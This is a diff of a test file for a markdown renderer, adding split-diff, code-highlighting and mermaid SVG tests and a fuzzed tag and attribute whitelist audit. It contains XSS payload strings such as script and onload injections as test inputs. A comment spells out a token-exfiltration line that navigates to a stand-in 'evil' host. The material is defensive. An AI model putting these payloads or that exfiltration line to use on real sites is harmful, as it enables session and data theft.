@@ -260,17 +260,84 @@ test("similarity separates an edit from an unrelated block", () => {
 });
 
 // ---------------------------------------------------------------------------
-// Escaping invariant, fuzzed.
-//
-// CSP here uses script-src 'unsafe-inline' (the page's own scripts are inline),
-// so CSP does NOT block script execution -- it only blocks loading external
-// resources. That makes this escaping the entire XSS defense, with nothing
-// behind it. Note also that exfiltration would not even need connect-src:
-// location.href = "http://evil/?t=" + TOKEN is a navigation, which CSP does not
-// govern. Hence: no plan text may ever reach innerHTML unescaped, fuzzed here
-// so a future edit cannot quietly reintroduce a sink.
+// Side-by-side (split) diff
 // ---------------------------------------------------------------------------
 
+test("splitDiff puts removals on the left and additions on the right", () => {
+  const s = MD.splitDiff("use redis for the bucket", "use postgres for the bucket");
+  assert.ok(s.before.includes("<del>redis</del>"), "left: " + s.before);
+  assert.ok(!s.before.includes("<ins>"), "addition leaked left: " + s.before);
+  assert.ok(s.after.includes("<ins>postgres</ins>"), "right: " + s.after);
+  assert.ok(!s.after.includes("<del>"), "removal leaked right: " + s.after);
+});
+
+test("splitDiff keeps the unchanged words on both sides", () => {
+  const s = MD.splitDiff("a b c", "a x c");
+  assert.ok(/a\s.*c/.test(s.before.replace(/<[^>]+>/g, "")), s.before);
+  assert.ok(/a\s.*c/.test(s.after.replace(/<[^>]+>/g, "")), s.after);
+});
+
+test("splitDiff escapes both sides", () => {
+  const s = MD.splitDiff("<img src=x>", "<script>alert(1)</script>");
+  assert.ok(!/<img/.test(s.before), s.before);
+  assert.ok(!/<script/.test(s.after), s.after);
+});
+
+test("splitRows gives one row per new block when nothing changed", () => {
+  const rows = MD.splitRows(V1, V1);
+  const blocks = MD.parse(V1);
+  assert.strictEqual(rows.length, blocks.length);
+  rows.forEach((r, i) => {
+    assert.strictEqual(r.status, "same");
+    assert.strictEqual(r.index, i);
+  });
+});
+
+test("splitRows marks an edited block changed and carries the old text", () => {
+  const v2 = V1.replace("Use Redis for the bucket.", "Use Postgres for the bucket.");
+  const row = MD.splitRows(V1, v2).find(r => r.status === "changed");
+  assert.ok(row, "no changed row");
+  assert.ok(row.prevText.includes("Redis"), row.prevText);
+  assert.ok(MD.parse(v2)[row.index].text.includes("Postgres"));
+});
+
+test("splitRows marks a new block added, with no left-hand side", () => {
+  const v2 = V1 + "\n## Rollout\n\nShip behind a flag.\n";
+  const rows = MD.splitRows(V1, v2).filter(r => r.status === "added");
+  assert.ok(rows.length >= 1);
+  rows.forEach(r => assert.strictEqual(r.prevText, ""));
+});
+
+test("splitRows emits a removed row with no right-hand side", () => {
+  const v2 = V1.replace("## Steps\n\n- one\n- two\n", "");
+  const rows = MD.splitRows(V1, v2).filter(r => r.status === "removed");
+  assert.ok(rows.length >= 1, "nothing reported removed");
+  rows.forEach(r => {
+    assert.strictEqual(r.index, -1);
+    assert.ok(r.prevText.length > 0);
+  });
+});
+
+test("a removed section stays contiguous, anchored to what preceded it", () => {
+  const v1 = "# Plan\n\n## Approach\n\nUse Redis.\n\n## Rollback\n\nFlip the flag off.\n\n## Steps\n\n- one\n";
+  const v2 = "# Plan\n\n## Approach\n\nUse Redis.\n\n## Steps\n\n- one\n";
+  const rows = MD.splitRows(v1, v2);
+  const removed = rows.map((r, i) => [r, i]).filter(x => x[0].status === "removed");
+  assert.strictEqual(removed.length, 2, "expected the heading and its paragraph");
+  assert.strictEqual(removed[1][1], removed[0][1] + 1,
+    "removed heading and paragraph were split apart: " +
+    JSON.stringify(rows.map(r => r.status)));
+  assert.ok(/Rollback/.test(removed[0][0].prevText), removed[0][0].prevText);
+});
+
+test("splitRows covers every new block exactly once, in order", () => {
+  const v2 = "# Plan\n\n## Approach\n\nUse Postgres.\n\n## Rollout\n\nShip it.\n";
+  const rows = MD.splitRows(V1, v2);
+  const seen = rows.filter(r => r.index >= 0).map(r => r.index);
+  assert.deepStrictEqual(seen, MD.parse(v2).map((_, i) => i));
+});
+
+// Hostile strings reused by the mermaid tests below and by the fuzz suite.
 const HOSTILE = [
   '<script>alert(1)</script>',
   '</script><script>alert(1)</script>',
@@ -286,6 +353,195 @@ const HOSTILE = [
   '<body onload=alert(1)>',
   '\u0001 0 \u0001',
 ];
+
+// ---------------------------------------------------------------------------
+// Fenced code: language capture and highlighting
+// ---------------------------------------------------------------------------
+
+test("fence language is captured and rendered as a label", () => {
+  const b = MD.parse("```python\nx = 1\n```")[0];
+  assert.strictEqual(b.lang, "python");
+  assert.ok(/class="lang"[^>]*>python</.test(b.html), "no language label: " + b.html);
+});
+
+test("a fence with no language still renders and carries no label", () => {
+  const b = MD.parse("```\nplain text\n```")[0];
+  assert.strictEqual(b.lang, "");
+  assert.ok(b.html.includes("<pre"), b.html);
+  assert.ok(!/class="lang"/.test(b.html), "empty label rendered: " + b.html);
+});
+
+test("a hostile fence language is sanitised away, not echoed", () => {
+  const b = MD.parse('```<img src=x onerror=alert(1)>\ncode\n```')[0];
+  assert.strictEqual(b.lang, "");
+  assert.ok(!/<img/i.test(b.html), "language leaked as markup: " + b.html);
+});
+
+test("highlighting marks keywords, strings and comments", () => {
+  const out = MD.highlight('def go(n):\n    # count\n    return "done"', "python");
+  assert.ok(/<span class="t-k">def<\/span>/.test(out), "keyword not marked: " + out);
+  assert.ok(/<span class="t-s">&quot;done&quot;<\/span>/.test(out), "string not marked: " + out);
+  assert.ok(/<span class="t-c"># count<\/span>/.test(out), "comment not marked: " + out);
+});
+
+test("highlighting an unknown language still escapes and returns the source", () => {
+  const out = MD.highlight('a <b> "c" 1', "brainfuck");
+  assert.ok(!/<b>/.test(out), "raw markup survived: " + out);
+  assert.ok(out.includes("&lt;b&gt;"), out);
+});
+
+test("highlighting never emits unescaped source", () => {
+  ['var s = "<img src=x onerror=alert(1)>";',
+   '# </script><script>alert(1)</script>',
+   "s = '<svg/onload=alert(1)>'"].forEach(src => {
+    ["js", "python", "bash", ""].forEach(lang => {
+      const out = MD.highlight(src, lang);
+      const residue = out.replace(/<\/?span class="t-[a-z]">/g, "").replace(/<\/span>/g, "");
+      assert.ok(!/[<>]/.test(residue.replace(/&lt;|&gt;|&amp;|&quot;|&#39;/g, "")),
+        "unescaped markup in highlight(" + JSON.stringify(src) + ", " + lang + "): " + out);
+    });
+  });
+});
+
+test("a code block's text stays the verbatim source, for anchoring", () => {
+  const src = "def go():\n    return 1";
+  const b = MD.parse("```python\n" + src + "\n```")[0];
+  assert.strictEqual(b.text, src);
+});
+
+// ---------------------------------------------------------------------------
+// Mermaid
+// ---------------------------------------------------------------------------
+
+const FLOW = "```mermaid\nflowchart TD\n  A[Start] --> B{Ok?}\n  B -->|yes| C[Ship]\n  B -->|no| D(Fix)\n```";
+
+test("a mermaid fence renders inline svg, not a code block", () => {
+  const b = MD.parse(FLOW)[0];
+  assert.strictEqual(b.lang, "mermaid");
+  assert.ok(b.html.includes("<svg"), "no svg: " + b.html);
+  assert.ok(!b.html.includes("<pre"), "fell back to source: " + b.html);
+});
+
+test("every flowchart node label appears in the svg", () => {
+  const html = MD.parse(FLOW)[0].html;
+  ["Start", "Ok?", "Ship", "Fix"].forEach(label =>
+    assert.ok(html.includes(">" + label + "<"), "missing label " + label + ": " + html));
+});
+
+test("edge labels are rendered", () => {
+  const html = MD.parse(FLOW)[0].html;
+  assert.ok(html.includes(">yes<"), "missing edge label: " + html);
+  assert.ok(html.includes(">no<"), "missing edge label: " + html);
+});
+
+test("node shapes are distinguishable", () => {
+  const html = MD.parse(FLOW)[0].html;
+  assert.ok(/<polygon /.test(html), "no diamond for {Ok?}: " + html);
+  assert.ok(/<rect /.test(html), "no rect for [Start]: " + html);
+});
+
+test("both graph and flowchart keywords parse, in every direction", () => {
+  ["flowchart TD", "flowchart LR", "graph TB", "graph RL", "graph BT"].forEach(head => {
+    const html = MD.parse("```mermaid\n" + head + "\n  A[One] --> B[Two]\n```")[0].html;
+    assert.ok(html.includes("<svg"), head + " did not render: " + html);
+    assert.ok(html.includes(">One<") && html.includes(">Two<"), head + ": " + html);
+  });
+});
+
+test("a bare node id with no shape still renders, labelled by its id", () => {
+  const html = MD.parse("```mermaid\ngraph LR\n  alpha --> beta\n```")[0].html;
+  assert.ok(html.includes(">alpha<") && html.includes(">beta<"), html);
+});
+
+test("a cycle terminates and still renders", () => {
+  const html = MD.parse("```mermaid\ngraph TD\n A[a] --> B[b]\n B --> C[c]\n C --> A\n```")[0].html;
+  assert.ok(html.includes("<svg"), html);
+  assert.ok(html.includes(">a<") && html.includes(">b<") && html.includes(">c<"), html);
+});
+
+test("a cycle does not inflate the layout with empty ranks", () => {
+  // A back edge used to push its own nodes down on every ranking pass, so a
+  // four-node loop rendered as fifteen ranks of mostly blank canvas.
+  const html = MD.parse("```mermaid\ngraph TD\n A[a] --> B[b]\n B --> C[c]\n C --> A\n```")[0].html;
+  const h = Number(/height="([\d.]+)"/.exec(html)[1]);
+  assert.ok(h < 320, "cycle produced a " + h + "px tall diagram for three ranks");
+});
+
+test("dotted and thick edges parse as edges", () => {
+  const html = MD.parse("```mermaid\ngraph LR\n A[a] -.-> B[b]\n B ==> C[c]\n A --- C\n```")[0].html;
+  assert.ok(html.includes("<svg"), html);
+  assert.ok(html.includes(">c<"), html);
+});
+
+test("sequenceDiagram renders participants and messages", () => {
+  const src = "```mermaid\nsequenceDiagram\n  participant Client\n  participant API\n" +
+              "  Client->>API: POST /ingest\n  API-->>Client: 202 Accepted\n```";
+  const html = MD.parse(src)[0].html;
+  assert.ok(html.includes("<svg"), html);
+  assert.ok(html.includes(">Client<") && html.includes(">API<"), html);
+  assert.ok(html.includes(">POST /ingest<"), html);
+  assert.ok(html.includes(">202 Accepted<"), html);
+});
+
+test("a dashed reply does not invent phantom participants", () => {
+  const src = "```mermaid\nsequenceDiagram\n  A->>B: ask\n  B-->>A: answer\n```";
+  const html = MD.parse(src)[0].html;
+  assert.ok(!/>B-</.test(html) && !/>A-</.test(html), "phantom lifeline: " + html);
+  assert.strictEqual((html.match(/class="mlife"/g) || []).length, 2,
+    "expected exactly two lifelines: " + html);
+});
+
+test("an unsupported diagram type falls back to the source, with a note", () => {
+  const src = "```mermaid\ngantt\n  title Roadmap\n  section One\n```";
+  const b = MD.parse(src)[0];
+  assert.ok(b.html.includes("<pre"), "did not fall back: " + b.html);
+  assert.ok(b.html.includes("title Roadmap"), "source lost in fallback: " + b.html);
+  assert.ok(/class="note"/.test(b.html), "no explanatory note: " + b.html);
+});
+
+test("a subgraph falls back rather than silently dropping the grouping", () => {
+  const src = "```mermaid\nflowchart TD\n subgraph edge\n A[a] --> B[b]\n end\n```";
+  const b = MD.parse(src)[0];
+  assert.ok(b.html.includes("<pre"), "grouping silently dropped: " + b.html);
+});
+
+test("a mermaid block's text stays the verbatim source, for anchoring", () => {
+  const b = MD.parse(FLOW)[0];
+  assert.ok(b.text.includes("flowchart TD"), b.text);
+  assert.ok(b.text.includes("B -->|yes| C[Ship]"), b.text);
+});
+
+test("hostile mermaid labels are escaped inside the svg", () => {
+  HOSTILE.forEach(hostile => {
+    const src = "```mermaid\nflowchart TD\n  A[" + hostile + "] -->|" + hostile +
+                "| B[" + hostile + "]\n```";
+    const html = MD.parse(src)[0].html;
+    assert.ok(!/<script|<img|<iframe|<foreignObject/i.test(html),
+      "live tag from label " + JSON.stringify(hostile) + ": " + html);
+    assert.ok(!/<[a-z][a-z0-9-]*[^>]*\son[a-z]+\s*=/i.test(html),
+      "event handler from label " + JSON.stringify(hostile) + ": " + html);
+    assert.ok(!/<[a-z][a-z0-9-]*[^>]*\shref/i.test(html),
+      "href from label " + JSON.stringify(hostile) + ": " + html);
+  });
+});
+
+test("a mermaid id cannot inject svg attributes", () => {
+  const html = MD.parse('```mermaid\ngraph LR\n  A" onload="alert(1) --> B[b]\n```')[0].html;
+  assert.ok(!/<[a-z][a-z0-9-]*[^>]*\sonload\s*=/i.test(html), html);
+});
+
+// ---------------------------------------------------------------------------
+// Escaping invariant, fuzzed.
+//
+// CSP here uses script-src 'unsafe-inline' (the page's own scripts are inline),
+// so CSP does NOT block script execution -- it only blocks loading external
+// resources. That makes this escaping the entire XSS defense, with nothing
+// behind it. Note also that exfiltration would not even need connect-src:
+// location.href = "http://evil/?t=" + TOKEN is a navigation, which CSP does not
+// govern. Hence: no plan text may ever reach innerHTML unescaped, fuzzed here
+// so a future edit cannot quietly reintroduce a sink.
+// ---------------------------------------------------------------------------
+
 
 // Every structural position a hostile string can occupy.
 const TEMPLATES = [
@@ -305,11 +561,53 @@ const TEMPLATES = [
 // Only these tags may ever appear in generated html. Asserting on the tag
 // whitelist rather than on substrings is the point: "&lt;img ... onerror=..." is
 // escaped, inert text and must NOT fail, while a real <img> must.
-const ALLOWED = "p|h1|h2|h3|ul|ol|li|code|pre|strong|em|blockquote|" +
-                "table|thead|tbody|tr|th|td|hr";
-const ALLOWED_TAG = new RegExp("</?(" + ALLOWED + ")>", "gi");
+// Only these tags may ever appear in generated html, and only these attribute
+// names on them. Asserting on a whitelist rather than on substrings is the
+// point: "&lt;img ... onerror=..." is escaped, inert text and must NOT fail,
+// while a real <img> must.
+//
+// Attributes exist here only because mermaid renders to inline SVG, which
+// cannot be drawn without geometry. Every one of these values is generated
+// from numbers we computed, never from plan text -- plan text reaches the SVG
+// only as escaped element content. The whitelist is what keeps that true.
+const ALLOWED = ("p h1 h2 h3 ul ol li code pre strong em blockquote " +
+                 "table thead tbody tr th td hr div span figure figcaption " +
+                 "svg g rect polygon ellipse circle line path text").split(" ");
+const ATTR_OK = ("class viewBox width height x y x1 y1 x2 y2 rx ry cx cy r " +
+                 "points fill stroke stroke-width stroke-dasharray stroke-linejoin " +
+                 "text-anchor dominant-baseline font-size aria-hidden role " +
+                 "preserveAspectRatio").split(" ");
 
-test("only whitelisted tags survive, for every hostile input and position", () => {
+const TAG = /<\/?([a-z][a-z0-9-]*)((?:\s[^>]*?)?)\/?>/gi;
+const ATTR = /([a-zA-Z][a-zA-Z0-9-]*)\s*=\s*"([^"]*)"/g;
+
+function auditTags(html, where) {
+  let m;
+  TAG.lastIndex = 0;
+  while ((m = TAG.exec(html))) {
+    const tag = m[1].toLowerCase();
+    assert.ok(ALLOWED.indexOf(tag) >= 0, "tag <" + tag + "> is not whitelisted:" + where);
+    const attrs = m[2];
+    if (!attrs.trim()) continue;
+    let a;
+    ATTR.lastIndex = 0;
+    let seen = "";
+    while ((a = ATTR.exec(attrs))) {
+      seen += a[0];
+      assert.ok(ATTR_OK.indexOf(a[1]) >= 0,
+        "attribute " + a[1] + " on <" + tag + "> is not whitelisted:" + where);
+      assert.ok(!/[<>]/.test(a[2]), "raw markup inside an attribute value:" + where);
+      assert.ok(!/javascript:|url\s*\(/i.test(a[2]),
+        "live url in attribute " + a[1] + ":" + where);
+    }
+    // Anything in the attribute region that was not a quoted name="value"
+    // pair means an unquoted or malformed attribute, i.e. injection.
+    assert.ok(attrs.replace(ATTR, "").trim() === "",
+      "unparsed attribute text on <" + tag + ">: " + attrs + where);
+  }
+}
+
+test("only whitelisted tags and attributes survive, for every hostile input and position", () => {
   HOSTILE.forEach(hostile => {
     TEMPLATES.forEach((tpl, ti) => {
       const md = tpl(hostile);
@@ -317,22 +615,38 @@ test("only whitelisted tags survive, for every hostile input and position", () =
       const where = "\n  template " + ti + " with " + JSON.stringify(hostile) +
         "\n  -> " + html;
 
+      auditTags(html, where);
+
       // Strip every tag we legitimately generate. Anything angle-bracketed
-      // left over is either an injected tag or an attribute-bearing tag --
-      // both mean plan text reached the DOM as markup.
-      const residue = html.replace(ALLOWED_TAG, "");
+      // left over means plan text reached the DOM as markup.
+      const residue = html.replace(TAG, "");
       assert.ok(!/[<>]/.test(residue.replace(/&lt;|&gt;|&amp;|&quot;|&#39;/g, "")),
         "unescaped markup survived:" + where + "\n  residue: " + residue);
-
-      // No tag may carry attributes: our generated tags never have any, so an
-      // attribute means injection.
-      assert.ok(!/<[a-z][a-z0-9]*\s[^>]*>/i.test(html),
-        "tag with attributes survived:" + where);
 
       assert.ok(!/javascript:/i.test(html.replace(/&[a-z]+;/g, "")) ||
                 !/<a\s/i.test(html),
         "javascript: url in a live anchor:" + where);
       assert.ok(!/undefined/.test(html), "sentinel corruption:" + where);
+    });
+  });
+});
+
+test("mermaid svg passes the same tag and attribute audit", () => {
+  HOSTILE.forEach(hostile => {
+    ["flowchart TD\n  A[" + hostile + "] -->|" + hostile + "| B[b]",
+     "sequenceDiagram\n  A->>B: " + hostile,
+     "graph LR\n  " + hostile + " --> B[b]"].forEach(body => {
+      const html = MD.parse("```mermaid\n" + body + "\n```")[0].html;
+      auditTags(html, "\n  mermaid " + JSON.stringify(body) + "\n  -> " + html);
+    });
+  });
+});
+
+test("highlighted code passes the same tag and attribute audit", () => {
+  HOSTILE.forEach(hostile => {
+    ["python", "js", "bash", "json", ""].forEach(lang => {
+      const html = MD.parse("```" + lang + "\n" + hostile + "\n```")[0].html;
+      auditTags(html, "\n  " + lang + " " + JSON.stringify(hostile) + "\n  -> " + html);
     });
   });
 });
